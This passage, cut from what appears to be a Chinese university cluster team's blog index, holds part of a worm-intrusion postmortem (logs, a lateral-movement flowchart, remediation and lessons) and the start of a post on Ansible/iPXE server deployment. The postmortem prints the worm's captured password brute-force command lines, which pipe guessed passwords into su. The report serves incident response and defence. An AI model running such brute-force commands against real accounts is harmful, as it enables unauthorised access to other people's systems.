zzm(uid=1000)\n</code></pre> </li> <li> <p>2025-03-13 08:57:36 \u653b\u51fb\u8005\u4ece pcie-up \u767b\u9646\u8ba1\u7b97\u8282\u70b9 M600\uff0c\u6b63\u5f0f\u8fdb\u5165\u8d85\u7b97\u961f\u96c6\u7fa4\uff0c\u6ce8\u5165 cron \u4efb\u52a1\u3002</p> <pre><code>2025-03-13 08:55:16.448 Accepted publickey for tkandi from ***.***.***.***(pcie-up) port 34028 ssh2: ED25519 SHA256:+jWKhy/TgGc8w9/r9VgKUK4HCuEZuhx34JmHI3RRnx0\n2025-03-13 08:57:36.915 pam_unix(sudo:session): session opened for user root(uid=0) by tkandi(uid=1005)\n2025-03-13 08:57:36.913 tkandi : TTY=pts/0 ; PWD=/home/tkandi ; USER=root ; COMMAND=/usr/bin/bash\n2025-03-13 09:17:01.298 (root) CMD (cd / &amp;&amp; run-parts --report /etc/cron.hourly)\n</code></pre> <p>\u8d85\u7b97\u961f\u96c6\u7fa4\u5185\u6240\u6709\u8d26\u6237 <code>sudo</code> \u514d\u5bc6\uff0c\u5bfc\u81f4\u6240\u6709\u7528\u6237\u79c1\u94a5\u6cc4\u9732\u3002\u6709\u540c\u5b66\u5728\u96c6\u7fa4\u4e0e\u4e2a\u4eba\u8bbe\u5907\u95f4\u5171\u7528\u5bc6\u94a5\u5bf9\uff0c\u4e3a\u653b\u51fb\u8005\u4ece\u516c\u7f51\u76f4\u63a5\u8bbf\u95ee\u96c6\u7fa4\u63d0\u4f9b\u4e86\u4fbf\u5229\u3002</p> <p>\u75c5\u6bd2\u540c\u6837\u5c1d\u8bd5\u7834\u89e3\u8d26\u6237\u5bc6\u7801\uff0c\u4f46\u7531\u4e8e\u8d85\u7b97\u961f\u96c6\u7fa4\u7684\u65e0\u5bc6\u7801\u7b56\u7565\uff0c\u5176\u7206\u7834\u624b\u6bb5\u672a\u80fd\u6210\u529f\u3002\u4ece cgroup \u5feb\u7167\u4e2d\u53ef\u4ee5\u770b\u5230\u8fd9\u662f\u5178\u578b\u7684\u5b57\u5178\u7206\u7834\u884c\u4e3a\uff1a</p> <pre><code>bash -c echo '43211234' | timeout 1.3 su azuk -c whoami 2&gt;/dev/null\nbash -c echo '4b62c0bc' | timeout 1.3 su bowling -c whoami 2&gt;/dev/null\nbash -c echo '5293946qwe' | timeout 1.3 su azuk -c whoami 2&gt;/dev/null\nbash -c echo '564209317' | timeout 1.3 su cage -c whoami 2&gt;/dev/null\n...\n</code></pre> </li> <li> <p>2025-03-13 09:17:46 M600 \u7684 SSH Daemon \u88ab\u653b\u51fb\u8005\u91cd\u542f\uff0c\u914d\u7f6e\u6587\u4ef6\u6216\u4e8c\u8fdb\u5236\u672c\u8eab\u53ef\u80fd\u88ab\u7be1\u6539\u3002</p> <pre><code>2025-03-13 09:17:46.845 ssh.service: Deactivated successfully\n2025-03-13 09:17:46.844 Stopping ssh.service - OpenBSD Secure Shell server..\n2025-03-13 09:17:46.843 Received signal 15; terminating\n2025-03-13 09:17:46.846 Stopped ssh.service - OpenBSD Secure Shell server\n2025-03-13 09:17:46.876 Starting ssh.service - OpenBSD Secure Shell server...\n</code></pre> </li> <li> <p>2025-03-13 09:17:24 \u653b\u51fb\u8005\u9996\u6b21\u4f7f\u7528\u7528\u6237 <code>xjun</code> \u4ece\u516c\u7f51\u8bbf\u95ee\u8d85\u7b97\u961f\u96c6\u7fa4\uff0c\u767b\u5165\u8ba1\u7b97\u8282\u70b9 M603\u3002\u968f\u540e <code>/etc/resolv.conf</code> \u88ab\u7be1\u6539\uff0c\u5bfc\u81f4\u7cfb\u7edf DNS \u89e3\u6790\u51fa\u73b0\u95ee\u9898\u3002</p> <pre><code>2025-03-13 09:17:24.478 Accepted publickey for xjun from ***.***.***.***(OpenNG) port 47370 ssh2: ED25519 SHA256:NzPCMMOV5RrYD0ikVea2bEjSE70SJmHkoAVI16UWcGI\n2025-03-13 09:18:42.900 pam_unix(sudo:session): session opened for user root(uid=0) by xjun(uid=1025)\n2025-03-13 09:18:42.899 xjun : TTY=pts/0 ; PWD=/home/xjun ; USER=root ; COMMAND=/usr/bin/bash\n2025-03-13 10:22:55.858 unable to get system name\n</code></pre> </li> <li> <p>2025-03-13 12:46:28 \u653b\u51fb\u8005\u901a\u8fc7 <code>bowling</code> \u7684 SSH \u914d\u7f6e\u6587\u4ef6\u8df3\u677f\u5230 ZJU Mirror\u3002\u6240\u5e78 Mirror \u7684\u5bc6\u7801\u590d\u6742\u5ea6\u8f83\u9ad8\uff0c\u672a\u80fd\u7206\u7834\u6210\u529f\u3002</p> <pre><code>2025-03-13 12:46:28.320 Accepted publickey for bowling from ***.***.***.***(\u96c6\u7fa4\u6821\u7f51) port 39121 ssh2: ED25519 SHA256:kFqyS5UJ1IgqPT79Y6BOj286/PhmO2KaK4ht6WT3wWk\n2025-03-13 12:46:28.323 pam_unix(sshd:session): session opened for user bowling(uid=1006) by (uid=0)\n2025-03-13 12:47:53.864 pam_unix(sudo:auth): authentication failure; logname=bowling uid=1006 euid=0 tty=/dev/pts/1 ruser=bowling rhost=  user=bowling\n2025-03-13 12:48:08.669 bowling : 3 incorrect password attempts ; TTY=pts/1 ; PWD=/home/bowling ; USER=root ; COMMAND=validate\n2025-03-13 13:10:30.381 pam_unix(su:auth): authentication failure; logname= uid=1006 euid=0 tty= ruser=bowling rhost=  user=cage\n2025-03-13 13:10:30.380 pam_unix(su:auth): authentication failure; logname= uid=1006 euid=0 tty= ruser=bowling rhost=  user=cage\n...\n</code></pre> </li> <li> <p>2025-03-15 02:10:06 \u653b\u51fb\u8005\u4ece\u516c\u7f51\u8bbf\u95ee\u8d85\u7b97\u961f\u96c6\u7fa4\uff0c\u5f00\u59cb\u6a2a\u5411\u79fb\u52a8\u3002\u6700\u7ec8\u4f7f\u7528\u7ba1\u7406\u5458 <code>star</code> \u7684\u5bc6\u94a5\u5bf9\u8fdb\u5165\u6838\u5fc3\u8282\u70b9 storage\u3002</p> <pre><code>flowchart LR\nn2[\"Internet\"]\nn2\nn2 ---|\"ssh\"| n6\nn6 ---|\"ssh\"| n7\nn7 ---|\"su\"| n1\nn1 ---|\"ssh\"| n3\nn3 ---|\"su\"| n4\nn4 ---|\"ssh\"| n5\nstyle s4 fill:#FF3131\nsubgraph s5[\"\u4fe1\u606f\u4e2d\u5fc3\u865a\u62df\u5316\u5e73\u53f0\"]\nsubgraph s7[\"ZJU Mirror\"]\nn8[\"bowling\"]\nend\nend\nsubgraph s6[\"\u8d85\u7b97\u961f\u5185\u7f51\"]\n    subgraph s4[\"storage\"]\n    n5[\"root\"]\n    end\n    subgraph s3[\"A700\"]\n    n4[\"star\"]\n    n3[\"rzm\"]\n    end\n    subgraph s2[\"M602\"]\n    n1[\"rzm\"]\n    n7[\"xjun\"]\n    end\n    subgraph s1[\"M603\"]\nn9[\"bowling\"]\n    n6[\"xjun\"]\n    end\nend\nn6 --- n9\nn9 --- n8\nstyle s7 fill:#FF3131</code></pre> </li> </ul>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u4e8b\u6545\u5904\u7406","title":"\u4e8b\u6545\u5904\u7406","text":"<ul> <li>2025-03-15 21:00-24:00 \u8c03\u67e5\u4e8b\u6545\u73b0\u573a\uff0c\u5b8c\u6210\u96c6\u7fa4\u5185\u90e8\u6eaf\u6e90\uff0c\u786e\u5b9a\u5f71\u54cd\u8303\u56f4\uff0c\u51b3\u5b9a\u4e34\u65f6\u5904\u7f6e\u7b56\u7565\uff1a<ul> <li>\u91cd\u88c5\u6838\u5fc3\u8282\u70b9 storage\uff0c\u4e0e\u96c6\u7fa4 LDAP \u7528\u6237\u7cfb\u7edf\u89e3\u7ed1\u3002</li> <li>\u5c06\u6570\u636e\u76ee\u5f55\u8bbe\u7f6e\u4e3a\u53ea\u8bfb\uff0c\u7ee7\u7eed\u89c2\u5bdf\u5916\u90e8\u653b\u51fb\u60c5\u51b5\u3002</li> </ul> </li> <li>2025-03-16 00:00-01:00 \u96c6\u7fa4\u5173\u95ed\uff0c\u91cd\u88c5 storage\u3002</li> <li>2025-03-16 01:00-02:00 \u6062\u590d storage \u4e0a\u7684\u670d\u52a1\uff0c\u6062\u590d\u8ba1\u7b97\u8282\u70b9 M603 \u7528\u4e8e\u89c2\u5bdf\u3002</li> <li>2025-03-16 02:00-04:00 \u5f00\u59cb\u96c6\u7fa4\u5916\u90e8\u6eaf\u6e90\uff0c\u53d1\u73b0\u516c\u5171\u73af\u5883\u4e0b\u7684\u5bc6\u94a5\u6cc4\u9732\u3002\u540a\u9500\u96c6\u7fa4\u7528\u6237\u7cfb\u7edf\u4e2d\u6240\u6709\u5bc6\u94a5\u5bf9\u3002</li> <li>2025-03-16 14:00-20:00 \u8c03\u6574\u7f51\u7edc\u7ed3\u6784\uff0c\u9694\u79bb\u5b89\u5168\u7a0b\u5ea6\u548c\u53ef\u63a7\u6027\u4e0d\u540c\u7684\u533a\u57df\u3002\u96c6\u7fa4\u6062\u590d\u8fd0\u884c\u3002</li> </ul> <p>\u96c6\u7fa4\u5916\u90e8\u7684\u4e8b\u6545\u5904\u7f6e\u4e0d\u5728\u672c\u6b21\u4e8b\u4ef6\u8303\u56f4\u3002</p>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u75c5\u6bd2\u4fe1\u606f","title":"\u75c5\u6bd2\u4fe1\u606f","text":"<p>\u5bf9\u75c5\u6bd2\u7684\u5177\u4f53\u5206\u6790\u89c1\u5947\u5b89\u4fe1\u60c5\u62a5\u6c99\u7bb1\uff0c\u76f8\u5173\u7684\u5f02\u5e38\u884c\u4e3a\u6211\u4eec\u90fd\u5728\u65e5\u5fd7\u4e2d\u627e\u5230\u4e86\u3002\u8be5\u75c5\u6bd2\u901a\u8fc7\u7206\u7834\u5f31\u5bc6\u7801\u3001\u7a83\u53d6\u79c1\u94a5\u7b49\u65b9\u5f0f\uff0c\u5728\u5185\u7f51\u8303\u56f4\u5185\u75af\u72c2\u4f20\u64ad\uff0c\u4e0d\u4ec5\u4f1a\u52a0\u8f7d ddos \u5de5\u5177\u7b49\u6076\u610f payload\uff0c\u8fd8\u4f1a\u5b9a\u65f6\u4fee\u6539\u7cfb\u7edf\u5173\u952e\u6587\u4ef6\uff0c\u6ce8\u5165 ssh \u516c\u94a5\uff0c\u4f7f\u5f97\u88ab\u611f\u67d3\u7684\u673a\u5668\u6210\u4e3a\u53ef\u4ee5\u88ab\u9ed1\u5ba2\u5b8c\u5168\u63a7\u5236\u7684\u8089\u9e21\u3002</p> <p>\u672c\u6b21\u653b\u51fb\u4e8b\u4ef6\u4e2d\uff0c\u75c5\u6bd2\u4e3b\u8981\u901a\u8fc7 SSH Config \u8fdb\u884c\u4f20\u64ad\u3002</p>"},{"location":"blog/2025/03/16/%E8%A0%95%E8%99%AB%E7%97%85%E6%AF%92%E5%85%A5%E4%BE%B5%E4%BA%8B%E4%BB%B6%E5%A7%8B%E6%9C%AB/#\u603b\u7ed3\u4e0e\u53cd\u601d","title":"\u603b\u7ed3\u4e0e\u53cd\u601d","text":"<p>\u672c\u6b21\u8815\u866b\u75c5\u6bd2\u5165\u4fb5\u4e8b\u4ef6\uff0c\u4e0d\u4ec5\u662f\u5bf9\u8d85\u7b97\u961f\u96c6\u7fa4\u5b89\u5168\u4f53\u7cfb\u7684\u4e00\u6b21\u4e25\u5cfb\u8003\u9a8c\uff0c\u4e5f\u4e3a\u6211\u4eec\u6572\u54cd\u4e86\u7f51\u7edc\u5b89\u5168\u7684\u8b66\u949f\uff1a</p> <ul> <li>ZJU Mirror \u7b49\u5173\u952e\u516c\u5171\u670d\u52a1\u66b4\u9732\u4e8e\u653b\u51fb\u4e2d\uff0c\u5173\u952e\u8fd0\u7ef4\u4eba\u5458\u5b89\u5168\u610f\u8bc6\u4e0d\u8db3\u3002\u6240\u5e78\u672c\u6b21\u906d\u9047\u7684\u662f\u8815\u866b\u75c5\u6bd2\uff0c\u672a\u9020\u6210\u91cd\u5927\u635f\u5931\u3002\u5982\u679c\u906d\u9047\u7c7b\u4f3cLUG \u670d\u52a1\u5668\u88ab\u5165\u4fb5\u4e8b\u4ef6\u59cb\u672b | Bojie Li\u7684\u6587\u4ef6\u7834\u574f\u4e8b\u4ef6\uff0c\u540e\u679c\u5c06\u4e0d\u582a\u8bbe\u60f3\u3002</li> <li>\u5c3d\u7ba1\u6211\u4eec\u5bf9\u5916\u90e8\u8bbf\u95ee\u8fdb\u884c\u4e86\u4e25\u683c\u7684\u4fdd\u62a4\uff0c\u4f46\u5185\u90e8\u8282\u70b9\u95f4\u7684\u4e92\u901a\u6027\u548c\u514d\u5bc6 sudo \u673a\u5236\u4e3a\u653b\u51fb\u8005\u63d0\u4f9b\u4e86\u53ef\u4e58\u4e4b\u673a\u3002\u672a\u6765\uff0c\u6211\u4eec\u5c06\u8fdb\u4e00\u6b65\u52a0\u5f3a\u5185\u90e8\u7f51\u7edc\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u5b9e\u65bd\u6700\u5c0f\u6743\u9650\u539f\u5219\uff0c\u5e76\u5f3a\u5236\u4f7f\u7528\u5e26 passphrase \u7684\u5bc6\u94a5\u5bf9\uff0c\u675c\u7edd\u5bc6\u94a5\u6cc4\u9732\u7684\u98ce\u9669\u3002</li> </ul> <p>\u65e0\u76d8\u7cfb\u7edf\u67b6\u6784\u548c\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u5728\u6b64\u6b21\u4e8b\u4ef6\u4e2d\u53d1\u6325\u4e86\u91cd\u8981\u4f5c\u7528\u3002\u901a\u8fc7 OverlayFS \u7684\u7279\u6027\uff0c\u6211\u4eec\u80fd\u591f\u5feb\u901f\u5b9a\u4f4d\u7cfb\u7edf\u6587\u4ef6\u7684\u7be1\u6539\u60c5\u51b5\uff1b\u800c\u57fa\u4e8e OpenTelemetry \u7684\u53ef\u89c2\u6d4b\u6027\u7cfb\u7edf\u5219\u5e2e\u52a9\u6211\u4eec\u9ad8\u6548\u8fd8\u539f\u4e86\u5165\u4fb5\u8fc7\u7a0b\u3002\u8fd9\u518d\u6b21\u8bc1\u660e\u4e86\u81ea\u52a8\u5316\u8fd0\u7ef4\u548c\u96c6\u4e2d\u76d1\u63a7\u5728\u96c6\u7fa4\u7ba1\u7406\u4e2d\u7684\u91cd\u8981\u6027\u3002</p> <p>\u6821\u56ed\u7f51\u7684\u5b89\u5168\u5f62\u52bf\u4f9d\u7136\u4e25\u5cfb\uff0c\u5f31\u53e3\u4ee4\u3001\u9ed8\u8ba4\u914d\u7f6e\u3001\u7ba1\u7406\u6df7\u4e71\u7b49\u95ee\u9898\u666e\u904d\u5b58\u5728\u3002\u5e0c\u671b\u901a\u8fc7\u6b64\u6b21\u4e8b\u4ef6\u7684\u5206\u4eab\uff0c\u80fd\u591f\u4e3a\u5176\u4ed6\u56e2\u961f\u63d0\u4f9b\u501f\u9274\uff0c\u907f\u514d\u7c7b\u4f3c\u4e8b\u4ef6\u7684\u53d1\u751f\u3002\u6211\u4eec\u547c\u5401\u5404\u5b9e\u9a8c\u5ba4\u548c\u56e2\u961f\u63d0\u9ad8\u5b89\u5168\u610f\u8bc6\uff0c\u5b9a\u671f\u8fdb\u884c\u5b89\u5168\u68c0\u67e5\u548c\u6f0f\u6d1e\u4fee\u590d\uff0c\u5171\u540c\u6784\u5efa\u4e00\u4e2a\u66f4\u52a0\u5b89\u5168\u7684\u7f51\u7edc\u73af\u5883\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/","title":"\u7b2c\u4e09\u4ee3\u955c\u50cf\u7ad9\u5efa\u8bbe\uff08\u4e00\uff09\uff1a\u670d\u52a1\u5668\u81ea\u52a8\u5316\u90e8\u7f72","text":"<p>ZJU \u7b2c\u4e09\u4ee3\u955c\u50cf\u7ad9\u57fa\u7840\u8bbe\u65bd\u8be6\u89c1 ZJU Mirror \u955c\u50cf\u7ad9\u3002</p> <p>\u5728\u6d4b\u8bd5\u9636\u6bb5\uff0c\u6211\u4eec\u9700\u8981\u9891\u7e41\u5730\u4e3a\u591a\u53f0\u670d\u52a1\u5668\u91cd\u88c5\u7cfb\u7edf\u3002\u672c\u6587\u5c06\u4ecb\u7ecd\u4e00\u79cd\u57fa\u4e8e Ansible \u7684\u81ea\u52a8\u5316\u670d\u52a1\u5668\u90e8\u7f72\u65b9\u6848\uff0c\u6db5\u76d6\u5e26\u5916\u7ba1\u7406\uff08Redfish\uff09\u3001\u7f51\u7edc\u5f15\u5bfc\uff08PXE\uff09\u4ee5\u53ca\u53d1\u884c\u7248\u5b89\u88c5\u7a0b\u5e8f\uff08\u652f\u6301 Debian \u548c Ubuntu\uff09\u7684\u5b8c\u6574\u6d41\u7a0b\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u7efc\u8ff0","title":"\u7efc\u8ff0","text":"<p>\u8981\u5728\u4e00\u53f0\u670d\u52a1\u5668\u4e0a\u8fdc\u7a0b\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\uff0c\u901a\u5e38\u9700\u8981\u4ee5\u4e0b\u51e0\u4e2a\u6b65\u9aa4\uff1a</p> <ul> <li>\u5e26\u5916\u7ba1\u7406\uff1a\u4f7f\u7528\u670d\u52a1\u5668\u7684\u7ba1\u7406\u63a5\u53e3\uff08\u5982 IPMI\u3001Redfish \u7b49\uff09\u8fdc\u7a0b\u8bbf\u95ee\u670d\u52a1\u5668\uff0c\u6302\u8f7d\u5b89\u88c5\u4ecb\u8d28\uff0c\u63a7\u5236\u7535\u6e90\u7b49\u3002</li> <li>\u5f15\u5bfc\u7a0b\u5e8f\uff1a\u7528\u4e8e\u5f15\u5bfc\u81f3\u53d1\u884c\u7248\u5b89\u88c5\u7a0b\u5e8f\uff0c\u5982 GRUB\u3001iPXE \u7b49\u3002</li> <li>\u53d1\u884c\u7248\u5b89\u88c5\u7a0b\u5e8f\uff1a\u8d1f\u8d23\u5b89\u88c5\u64cd\u4f5c\u7cfb\u7edf\u7684\u7a0b\u5e8f\uff0c\u5982 Debian Installer\u3001Ubuntu Installer \u7b49\u3002</li> </ul> <p>\u9700\u8981\u90e8\u7f72\u591a\u53f0\u8282\u70b9\u65f6\uff0c\u4eba\u5de5\u9010\u53f0\u64cd\u4f5c\u662f\u96be\u4ee5\u63a5\u53d7\u7684\u3002\u4e8b\u5b9e\u4e0a\uff0c\u4e0a\u8ff0\u51e0\u4e2a\u6b65\u9aa4\u90fd\u80fd\u591f\u8fdb\u884c\u81ea\u52a8\u5316\u914d\u7f6e\u3002\u501f\u52a9 Ansible \u7b49\u5de5\u5177\uff0c\u53ef\u4ee5\u5b9e\u73b0\u670d\u52a1\u5668\u7684\u6279\u91cf\u81ea\u52a8\u5316\u90e8\u7f72\u3002\u6d41\u7a0b\u5982\u4e0b\u6240\u793a\uff0c\u6e90\u7801\u89c1 [TODO]\u3002</p> <ol> <li> <p>\u914d\u7f6e\u6587\u4ef6\u751f\u6210\uff1a<code>.j2</code> \u540e\u7f00\u8868\u793a Jinja2 \u6a21\u677f\u6587\u4ef6\uff0c\u5c06\u7531 Ansible \u6e32\u67d3\u751f\u6210\u6700\u7ec8\u7684\u914d\u7f6e\u6587\u4ef6\u3002</p> <ul> <li><code>ipxe.j2</code>\uff1aiPXE \u5f15\u5bfc\u811a\u672c\uff0c\u8d1f\u8d23\u5f15\u5bfc\u8fdb\u5165 Debian \u5b89\u88c5\u7a0b\u5e8f\u7684\u8fc7\u7a0b\uff1a<ul> <li>\u914d\u7f6e\u7f51\u7edc\uff1a\u68c0\u6d4b\u53ef\u7528\u7684\u7f51\u7edc\u63a5\u53e3\u5e76\u914d\u7f6e IP \u5730\u5740\u3002</li> <li>\u62c9\u53d6\u542f\u52a8\u6587\u4ef6\uff1a\u4ece HTTP \u670d\u52a1\u5668\u4e0b\u8f7d\u5185\u6838\u548c initrd \u6587\u4ef6\u3002</li> <li>\u542f\u52a8\u5b89\u88c5\uff1a\u4f7f\u7528\u4e0b\u8f7d\u7684\u5185\u6838\u548c initrd \u6587\u4ef6\u542f\u52a8\u5b89\u88c5\u8fc7\u7a0b\u3002</li> </ul> </li> <li><code>user-data.j2</code>\uff1aUbuntu autoinstall \u914d\u7f6e\u6587\u4ef6\u6a21\u7248\u3002\u8d1f\u8d23\uff1a<ul> <li>\u5b9a\u4e49\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u7684\u5404\u79cd\u53c2\u6570\uff0c\u5982\u8bed\u8a00\u3001\u65f6\u533a\u3001\u5206\u533a\u65b9\u6848\u7b49\u3002</li> <li>\u8bbe\u7f6e\u7f51\u7edc\u914d\u7f6e\uff0c\u5305\u62ec\u4e3b\u673a\u540d\u3001IP \u5730\u5740\u548c LACP \u805a\u5408\u3002</li> <li>\u5b9a\u4e49\u8f6f\u4ef6\u5305\u9009\u62e9\u548c\u5b89\u88c5\u9009\u9879\u3002</li> <li>\u8bbe\u7f6e\u7528\u6237\u3001\u5bc6\u7801\u3001SSH \u5bc6\u94a5\u7b49\u4fe1\u606f\u3002</li> </ul> </li> </ul> </li> <li> <p>iPXE \u5f15\u5bfc\u955c\u50cf\u751f\u6210\uff1a</p> <p>\u4f7f\u7528 Docker \u7f16\u8bd1 <code>bin-x86_64-efi/ipxe.iso</code> \u5f15\u5bfc\u955c\u50cf\uff0c\u5d4c\u5165\u81ea\u5b9a\u4e49\u5f15\u5bfc\u811a\u672c\u3002</p> </li> <li> <p>\u81ea\u52a8\u90e8\u7f72\uff1a</p> <ul> <li>\u672c\u5730\u542f\u52a8\u9002\u5f53\u534f\u8bae\u7684\u670d\u52a1\u5668\uff08HTTP\u3001NFS\u3001CIFS \u7b49\uff09\uff0c\u4f9b\u5e26\u5916\u7ba1\u7406\u548c\u5f15\u5bfc\u7a0b\u5e8f\u83b7\u53d6\u6587\u4ef6\u3002</li> <li>\u4f7f\u7528 hREST API \u63a7\u5236\u5e26\u5916\u7ba1\u7406\u6302\u8f7d\u5f15\u5bfc\u955c\u50cf\uff0c\u5e76\u8bbe\u7f6e\u5355\u6b21\u542f\u52a8\u5230\u5f15\u5bfc\u7a0b\u5e8f\u3002</li> <li>iPXE \u81ea\u52a8\u4e0b\u8f7d\u5185\u6838\u548c initrd \u6587\u4ef6\uff0c\u542f\u52a8 Ubuntu \u5b89\u88c5\u7a0b\u5e8f\u3002</li> <li>Ubuntu \u5b89\u88c5\u7a0b\u5e8f\u6839\u636e\u5185\u6838\u542f\u52a8\u53c2\u6570\uff0c\u81ea\u52a8\u4e0b\u8f7d ISO \u5b89\u88c5\u4ecb\u8d28\u548c autoinstall \u914d\u7f6e\u6587\u4ef6\uff0c\u5b8c\u6210\u5b89\u88c5\u3002</li> </ul> </li> </ol>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u5e26\u5916\u7ba1\u7406","title":"\u5e26\u5916\u7ba1\u7406","text":"<p>\u6709\u5173\u5e26\u5916\u7ba1\u7406\u7684\u57fa\u7840\u77e5\u8bc6\uff0c\u8bf7\u53c2\u8003 \u786c\u4ef6\u8fd0\u7ef4/\u5e26\u5916\u7ba1\u7406\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#api","title":"API","text":"<p>\u65b0\u955c\u50cf\u7ad9\u91c7\u7528 H3C \u670d\u52a1\u5668\uff0c\u5176\u5e26\u5916\u7ba1\u7406\u7cfb\u7edf\u4e3a HDM\u3002HDM 2.1 \u53ca\u4ee5\u4e0a\u7248\u672c\u652f\u6301 Redfish API\uff0c\u800c\u66f4\u65e9\u7248\u672c\u4ec5\u652f\u6301 H3C \u81ea\u5b9a\u4e49\u7684 hREST API\u3002</p> <ul> <li>H3C R4900\uff1a\u5347\u7ea7 HDM \u81f3\u6700\u65b0\u7248\u672c\uff083.54\uff09\u540e\u652f\u6301 Redfish API\u3002</li> <li>H3C X10536\uff1a\u6700\u65b0 HDM \u7248\u672c\u4e3a 1.11\uff0c\u4ec5\u652f\u6301 hREST API\u3002</li> </ul> <p>\u5c3d\u7ba1\u6700\u65b0 HDM \u63d0\u4f9b\u4e86 Redfish API\uff0c\u4f46\u90e8\u5206\u5173\u952e\u529f\u80fd\uff08\u5982\u8fdc\u7a0b\u955c\u50cf\u6302\u8f7d\uff09\u4ecd\u4f7f\u7528\u5382\u5546\u81ea\u5b9a\u4e49\u63a5\u53e3\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u6700\u7ec8\u7edf\u4e00\u91c7\u7528 hREST API\u3002</p> <p>H3C Redfish \u81ea\u5b9a\u4e49\u63a5\u53e3</p> <p>Ansible \u7684 Redfish \u6a21\u5757\u4ec5\u652f\u6301\u6807\u51c6\u63a5\u53e3\uff1a</p> <pre><code>/redfish/v1/Managers/1/VirtualMedia/{Slot}/Actions/VirtualMedia.InsertMedia\n</code></pre> <p>\u800c H3C \u7684 OEM \u81ea\u5b9a\u4e49\u63a5\u53e3\u4e3a\uff1a</p> <pre><code>/redfish/v1/Managers/1/VirtualMedia/CD/Oem/Public/Actions/VirtualMedia.VmmControl\n</code></pre> <p>\u8bf7\u6c42\u793a\u4f8b\uff1a</p> <pre><code>{\n    \"VmmControlType\": \"Connect\",\n    \"Image\": \"nfs://.iso\"\n}\n</code></pre> <p>H3C \u5b98\u7f51\u53d1\u5e03\u7684 hREST \u8f6f\u4ef6\u4ee5 Python \u6e90\u7801\u5f62\u5f0f\u63d0\u4f9b\uff0c\u4f46\u4ec5\u652f\u6301\u5230 CentOS 7\uff0c\u65e0\u6cd5\u76f4\u63a5\u5728 macOS \u6216 Debain12 \u7b49\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002\u4e0d\u8fc7\uff0c\u7531\u4e8e\u6e90\u7801\u5f00\u653e\uff0c\u53ef\u4ee5\u901a\u8fc7\u9002\u914d\u8fc1\u79fb\u5230\u6700\u65b0\u7684 Python \u7248\u672c\u3002</p> <p>\u4ece\u4ee3\u7801\u6ce8\u91ca\u6765\u770b\uff0chREST \u8f6f\u4ef6\u672c\u8d28\u4e0a\u662f\u901a\u8fc7\u9006\u5411 HDM \u7f51\u9875\u8bf7\u6c42\u5b9e\u73b0\u7684\uff08\u5410\u69fd\uff1aHDM \u548c hREST \u7684\u5f00\u53d1\u56e2\u961f\u4e3a\u4f55\u4e0d\u5171\u4eab API \u6587\u6863\uff1f\uff09\u3002\u5728\u4f7f\u7528\u8fc7\u7a0b\u4e2d\uff0c\u5982\u9047\u95ee\u9898\uff0c\u53ef\u76f4\u63a5\u5bf9\u6bd4 HDM \u7f51\u9875\u884c\u4e3a\u5e76\u4fee\u590d\u4ee3\u7801\u3002</p> <p>\u6700\u7ec8\uff0c\u6211\u4eec\u63d0\u53d6\u5e76\u7b80\u5316\u4e86 hREST API \u7684 Python \u5b9e\u73b0\uff0c\u80fd\u591f\u5728 Linux \u548c macOS \u4e0a\u6b63\u5e38\u8fd0\u884c\u3002\u4ee3\u7801\u8be6\u89c1 [TODO]\u3002</p>"},{"location":"blog/2025/05/01/%E7%AC%AC%E4%B8%89%E4%BB%A3%E9%95%9C%E5%83%8F%E7%AB%99%E5%BB%BA%E8%AE%BE%E4%B8%80%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#\u955c\u50cf\u6302\u8f7d","title":"\u955c\u50cf\u6302\u8f7d","text":"<p>HDM \u652f\u6301\u901a\u8fc7 NFS \u548c CIFS \u6302\u8f7d\u955c\u50cf\u3002\u7136\u800c\uff0c\u7531\u4e8e\u6821\u7f51\u51fa\u4e8e\u5b89\u5168\u539f\u56e0\uff08\u5982\u9632\u8303\u6c38\u6052\u4e4b\u84dd\u6f0f\u6d1e\uff09\u5168\u5c40\u5c4f\u853d\u4e86 CIFS \u76f8\u5173\u7aef\u53e3\uff0c\u56e0\u6b64\u53ea\u80fd\u4f7f\u7528 NFS\u3002</p> <p>NFS \u7684\u4e3b\u8981\u9650\u5236\u662f\u9700\u8981\u5185\u6838\u7ea7\u670d\u52a1\u7aef\u652f\u6301\uff0c\u65e0\u6cd5\u50cf dperson/samba \u90a3\u6837\u901a\u8fc7 Docker \u7b80\u6d01\u8fd0\u884c\u3002\u4e0d\u8fc7\uff0c\u6211\u4eec\u7684 Ansible Playbook 